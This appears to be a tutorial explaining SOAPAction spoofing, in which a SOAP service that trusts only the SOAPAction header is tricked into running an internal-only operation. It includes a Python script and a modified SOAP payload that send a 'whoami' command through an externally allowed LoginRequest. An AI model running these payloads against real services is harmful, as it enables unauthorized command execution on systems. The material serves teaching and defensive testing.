SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name, in which the receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

The following is an example of a SOAPAction operation:
```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```
Below is its corresponding parameters:
```xml
<s:element name="ExecuteCommandRequest">
	<s:complexType>
		<s:sequence>
			<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
		</s:sequence>
	</s:complexType>
</s:element>
```

Notice that there is a `cmd` parameter. The following Python script can be used to issue requests to execute the `whoami` command, in this example.
```python
import requests

payload = """
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
<soap:Body>
<ExecuteCommandRequest xmlns="http://tempuri.org/">
<cmd>whoami</cmd>
</ExecuteCommandRequest>
</soap:Body>
</soap:Envelope>
"""

req = requests.post(
	'http://target-website.com/wsdl',
	data=payload,
	headers={"SOAPAction": '"ExecuteCommand"'}
)

print(req.content)
```

When we execute this script, it will throw an error as the `ExecuteCommand` action is only allowed internally. However, not all is lost, we can still try for SOAPAction spoofing attack. To do this, we will replace our `payload` variable's value with the following:
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
<soap:Body>
<LoginRequest xmlns="http://tempuri.org/">
<cmd>whoami</cmd>
</LoginRequest>
</soap:Body>
</soap:Envelope>
```
In our new payload, we did the following:
- We specify `LoginRequest` in `<soap:Body>` instead, since this operation is allowed externally, our request will go through.
- Inside the `LoginRequest`, we will specify the parameters of `ExecuteCommandRequest` because our aim is to achieve code execution.
- We will leave the value of `SOAPAction` HTTP header to `ExecuteCommand`.

If the web service does not implement additional checks and only uses the `SOAPAction` HTTP to determine which operation to execute, we can bypass any security filters/restrictions of the SOAP service.